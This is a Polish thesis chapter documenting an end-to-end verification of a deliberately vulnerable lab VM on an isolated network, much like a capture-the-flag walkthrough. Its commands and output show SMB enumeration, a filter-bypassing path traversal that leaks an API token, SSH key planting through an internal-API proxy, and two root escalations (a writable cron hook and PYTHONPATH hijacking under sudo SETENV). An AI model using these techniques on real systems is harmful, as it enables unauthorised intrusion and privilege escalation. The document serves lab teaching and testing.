\chapter{Scenariusze weryfikacji}
\label{chap:weryfikacja}

W celu potwierdzenia, że zaprojektowany w rozdziale \ref{chap:konfiguracja} łańcuch zależności pomiędzy usługami jest w pełni funkcjonalny i powtarzalny, przeprowadzono manualny test weryfikacyjny \emph{End-to-End}. Test zrealizowano z pozycji stacji analitycznej podłączonej do izolowanej sieci \texttt{vboxnet0} (\texttt{192.168.56.0/24}), rozpoczynając od poziomu zerowej wiedzy o konfiguracji docelowego hosta (\texttt{0-knowledge}, adres IP maszyny \texttt{192.168.56.101}) aż do uzyskania uprawnień \texttt{root} i odczytu obu flag.

\TikzFigure[0.98]{sekwencja_weryfikacji.tex}{Diagram sekwencji wywołań zrealizowanych podczas praktycznej weryfikacji E2E}{fig:sekwencja}

Na rysunku \ref{fig:sekwencja} przedstawiono przebieg komunikacji pomiędzy stacją analityczną a kolejnymi usługami uruchomionymi na maszynie \textbf{VulnBox}.

\section{Etap 1: Rekonesans sieciowy i enumeracja zasobu Samba}
\label{sec:etap1-samba}

Pierwszym krokiem procedury weryfikacyjnej było przeskanowanie portów TCP maszyny \texttt{192.168.56.101} w celu weryfikacji polityki zapory UFW.

\begin{lstlisting}[language=bash, caption={Skanowanie otwartych portów TCP na hoście 192.168.56.101 narzędziem nmap}, label={lst:e2e-nmap}]
$ sudo nmap -sV -p 22,445,5000,8080 192.168.56.101
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 10.2p1 Ubuntu 2ubuntu3.8 (Ubuntu Linux; protocol 2.0)
445/tcp  open     netbios-ssn Samba smbd 4.6.2
5000/tcp filtered upnp
8080/tcp open     http        nginx 1.28.3 (Ubuntu)
\end{lstlisting}

Jak wynika z listingu \ref{lst:e2e-nmap}, port \texttt{5000/tcp} jest blokowany z zewnątrz przez zaporę UFW (\texttt{filtered}), a dostępne pozostają wyłącznie usługi SSH, Samba oraz serwer HTTP Nginx. Następnie wylistowano dostępne udziały sieciowe usługi Samba bez podawania poświadczeń.

\begin{lstlisting}[language=bash, caption={Wylistowanie anonimowych udziałów SMB narzędziem smbclient}, label={lst:e2e-smb-list}]
$ smbclient -N -L //192.168.56.101/
        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      VulnBox Public Deployment Notes
        IPC$            IPC       IPC Service (VulnBox File Server)
SMB1 disabled -- no workgroup available
\end{lstlisting}

Po zidentyfikowaniu publicznego udziału \texttt{public} (listing \ref{lst:e2e-smb-list}) pobrano bezpośrednio na standardowe wyjście pozostawiony w nim plik \texttt{deployment-notes.txt}.

\begin{lstlisting}[language=bash, caption={Pobranie i odczyt pliku deployment-notes.txt z udziału public}, label={lst:e2e-smb-get}]
$ smbclient -N //192.168.56.101/public -c "get deployment-notes.txt -"
========================================================================
VulnBox - Internal Deployment Notes (Draft v1.2)
========================================================================
Host:              vulnbox
Service Account:   dev
Web Portal (:8080): /var/www/vulnbox/index.php (?module=status)
Diagnostics View:   /?log=<filename> (logs dir: /var/log/webapp/)
Internal Bridge:    /?proxy_path=<endpoint>&token=<tok>

Internal Services:
- Loopback Flask API binds strictly to 127.0.0.1:5000 (systemd: flask-internal)
- Service configuration and API token stored in:
  /opt/internal_api/config.ini
- Scheduled maintenance scripts located in /opt/admin/

Reminder:
Remove this draft file from /srv/samba/public before production handover.
========================================================================
\end{lstlisting}

Notatka pobrana w listingu \ref{lst:e2e-smb-get} ujawnia parametry portalu diagnostycznego na porcie \texttt{8080/tcp}, lokalizację pliku \path{/opt/internal_api/config.ini} z tokenem API oraz adres wewnętrznego serwisu Flask (\texttt{127.0.0.1:5000}).

\section{Etap 2: Weryfikacja portalu WWW (:8080) i odczyt konfiguracji API}
\label{sec:etap2-web}

W drugim etapie sprawdzono najpierw punkt diagnostyczny \texttt{?module=status} portalu WWW, potwierdzając jego działanie oraz obsługiwane parametry wejściowe.

\newpage

\begin{lstlisting}[language=bash, caption={Weryfikacja statusu portalu WWW na porcie 8080/tcp}, label={lst:e2e-web-status}]
$ curl -s "http://192.168.56.101:8080/?module=status"
=== VulnBox Diagnostics Portal ===
Service: vulnbox-web (Nginx + PHP-FPM)
Status: ONLINE
Base Log Directory: /var/log/webapp/
Internal API Bridge: http://127.0.0.1:5000
Usage:
  ?module=status                     - Display service health summary
  ?log=<filename>                    - View diagnostic log from /var/log/webapp/
  ?proxy_path=<endpoint>&token=<tok> - Query local management API on 127.0.0.1:5000
\end{lstlisting}

Następnie za pomocą zagnieżdżonej sekwencji \texttt{....//....//....//} ominięto jednoprzebiegowy filtr \texttt{str\_replace('../', '', ...)} w parametrze \texttt{?log=}, co pozwoliło na odczyt pliku konfiguracyjnego \path{/opt/internal_api/config.ini} w kontekście uprawnień grupy \texttt{www-data}.

\begin{lstlisting}[language=bash, caption={Odczyt pliku /opt/internal\_api/config.ini przez parametr ?log=}, label={lst:e2e-web-traversal}]
$ curl -s "http://192.168.56.101:8080/?log=....//....//....//opt/internal_api/config.ini"
[VulnBox Log Viewer] Requested path: /var/log/webapp/../../../opt/internal_api/config.ini

[service]
name = vulnbox-internal-api
bind_host = 127.0.0.1
bind_port = 5000
environment = lab-verification

[security]
# Static token required in X-Internal-Token header for /api/v1/* endpoints
api_token = vb-internal-9f8e7d6c5b4a3f2e1d0c
target_account = dev
authorized_keys_path = /home/dev/.ssh/authorized_keys
\end{lstlisting}

W wyniku zapytania z listingu \ref{lst:e2e-web-traversal} uzyskano statyczny token autoryzacyjny oraz potwierdzono, że serwis wewnętrzny zarządza plikiem \path{/home/dev/.ssh/authorized_keys}.

\section{Etap 3: Komunikacja z lokalnym serwisem Flask i dostęp SSH na konto dev}
\label{sec:etap3-flask}

Ponieważ serwis Flask nasłuchuje wyłącznie na interfejsie lokalnym (\texttt{127.0.0.1:5000}), komunikację z nim zrealizowano przez parametr mostka \texttt{?proxy\_path=}. Przekazując pozyskany w etapie 2 token, zweryfikowano metadane API oraz przesłano klucz publiczny SSH analityka.

\newpage

\begin{lstlisting}[language=bash, caption={Weryfikacja tokenu i rejestracja klucza SSH przez mostek ?proxy\_path=}, label={lst:e2e-api-sshkey}]
$ curl -s "http://192.168.56.101:8080/?proxy_path=/api/v1/info&token=vb-internal-9f8e7d6c5b4a3f2e1d0c"
{"authorized_keys_path":"/home/dev/.ssh/authorized_keys","endpoints":["/health","/api/v1/info","/api/v1/ssh-key"],"managed_account":"dev","service":"vulnbox-internal-api"}

$ curl -s -X POST "http://192.168.56.101:8080/?proxy_path=/api/v1/ssh-key&token=vb-internal-9f8e7d6c5b4a3f2e1d0c" --data-urlencode "ssh_key=$(cat ~/.ssh/id_ed25519.pub)"
{"account":"dev","authorized_keys_path":"/home/dev/.ssh/authorized_keys","status":"registered"}
\end{lstlisting}

Po dopisaniu klucza przez API (listing \ref{lst:e2e-api-sshkey}) nawiązano interaktywną sesję SSH na porcie \texttt{22/tcp} jako użytkownik \texttt{dev} i odczytano pierwszą flagę z pliku \path{/home/dev/user.txt}.

\begin{lstlisting}[language=bash, caption={Logowanie SSH na konto dev i odczyt flagi /home/dev/user.txt}, label={lst:e2e-ssh-user}]
$ ssh -i ~/.ssh/id_ed25519 dev@192.168.56.101
Welcome to Ubuntu 26.04.1 LTS (GNU/Linux 7.0.0-44-generic x86_64)

dev@vulnbox:~$ id && cat /home/dev/user.txt
uid=1001(dev) gid=1001(dev) groups=1001(dev)
FLAG{Us3r_Sh3ll!7xK9#mP2@vQ4_d3v%8nR1}
\end{lstlisting}

Poprawne uwierzytelnienie kluczem SSH oraz odczyt flagi \path{/home/dev/user.txt} (listing \ref{lst:e2e-ssh-user}) potwierdzają ukończenie etapu użytkownika nieuprzywilejowanego.

\section{Etap 4: Weryfikacja dwóch ścieżek eskalacji do konta root}
\label{sec:etap4-root}

Z poziomu otwartej sesji SSH użytkownika \texttt{dev} zweryfikowano obie niezależne ścieżki prowadzące do uprawnień \texttt{root} i odczytu flagi \path{/root/root.txt}.

\subsection{Ścieżka A: Zadanie cykliczne Cron i skrypt z uprawnieniami grupy dev}
\label{subsec:sciezka-a-cron}

W pierwszym kroku odczytano definicję zadania \path{/etc/cron.d/vulnbox-maintenance} oraz sprawdzono uprawnienia skryptu \path{/opt/admin/hooks/pre_backup.sh}.

\begin{lstlisting}[language=bash, caption={Inspekcja zadania cron oraz uprawnień pliku pre\_backup.sh}, label={lst:e2e-cron-inspect}]
dev@vulnbox:~$ cat /etc/cron.d/vulnbox-maintenance
# /etc/cron.d/vulnbox-maintenance
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root /opt/admin/backup_check.sh >/dev/null 2>&1

dev@vulnbox:~$ ls -la /opt/admin/hooks/pre_backup.sh
-rwxrwxr-x 1 root dev 106 Nov 23 21:15 /opt/admin/hooks/pre_backup.sh
\end{lstlisting}

Z uwagi na uprawnienia \texttt{0775} dla grupy \texttt{dev} (listing \ref{lst:e2e-cron-inspect}), otwarto plik \path{/opt/admin/hooks/pre_backup.sh} w edytorze \texttt{nano} (\texttt{nano /opt/admin/hooks/pre\_backup.sh}) i zapisano w nim kod przedstawiony na listingu \ref{lst:e2e-cron-nano}.

\begin{lstlisting}[style=code, language=bash, caption={Zawartość skryptu /opt/admin/hooks/pre\_backup.sh zapisana w edytorze nano}, label={lst:e2e-cron-nano}]
#!/usr/bin/env bash
set -euo pipefail
id > /tmp/cron_verify.out
cat /root/root.txt >> /tmp/cron_verify.out
chmod 0600 /tmp/cron_verify.out
chown dev:dev /tmp/cron_verify.out
\end{lstlisting}

Po odczekaniu jednego cyklu harmonogramu (\texttt{sleep 65}) odczytano utworzony przez demona \texttt{cron} plik.

\begin{lstlisting}[language=bash, caption={Odczyt wyniku wykonania zadania cron i flagi /root/root.txt}, label={lst:e2e-cron-exec}]
dev@vulnbox:~$ sleep 65 && cat /tmp/cron_verify.out
uid=0(root) gid=0(root) groups=0(root)
FLAG{R00t_Pwn3d!9zW6@kL3#bT8_sys%4mX2}
\end{lstlisting}

\subsection{Ścieżka B: Reguła sudoers.d i przechwycenie modułu Pythona}
\label{subsec:sciezka-b-sudo}

Niezależnie zweryfikowano uprawnienia \texttt{sudo -l} oraz prawa do modułu \path{/opt/admin/status_helper.py}.

\begin{lstlisting}[language=bash, caption={Weryfikacja reguły sudo -l oraz uprawnień modułu status\_helper.py}, label={lst:e2e-sudo-inspect}]
dev@vulnbox:~$ sudo -l && ls -la /opt/admin/status_helper.py
User dev may run the following commands on vulnbox:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/admin/maintenance.py
-rw-rw-r-- 1 root dev 344 Nov 23 21:15 /opt/admin/status_helper.py
\end{lstlisting}

Korzystając z opcji \texttt{SETENV} (listing \ref{lst:e2e-sudo-inspect}), utworzono w edytorze \texttt{nano} (\texttt{nano /tmp/status\_helper.py}) pomocniczy moduł Pythona odczytujący flagę administratora (listing \ref{lst:e2e-sudo-nano}).

\begin{lstlisting}[style=code, language=Python, caption={Zawartość modułu /tmp/status\_helper.py utworzona w edytorze nano}, label={lst:e2e-sudo-nano}]
import os
from pathlib import Path

def collect_system_summary():
    return {
        "euid": os.geteuid(),
        "root_flag": Path("/root/root.txt").read_text(encoding="utf-8").strip(),
    }
\end{lstlisting}

Następnie uruchomiono skrypt \path{/opt/admin/maintenance.py} przez \texttt{sudo} z przekazaniem \texttt{PYTHONPATH=/tmp}, co spowodowało załadowanie podstawionego modułu w kontekście \texttt{root} i natychmiastowe wypisanie zawartości pliku \path{/root/root.txt}.

\begin{lstlisting}[language=bash, caption={Wykonanie maintenance.py ze zmienną PYTHONPATH=/tmp i odczyt root.txt}, label={lst:e2e-sudo-exec}]
dev@vulnbox:~$ sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/admin/maintenance.py
[VulnBox Maintenance] System summary: {"euid": 0, "root_flag": "FLAG{R00t_Pwn3d!9zW6@kL3#bT8_sys%4mX2}"}
\end{lstlisting}
